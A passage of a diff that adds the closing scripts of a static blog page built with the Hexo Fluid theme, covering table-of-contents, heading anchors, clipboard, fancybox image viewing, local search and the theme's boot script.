+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
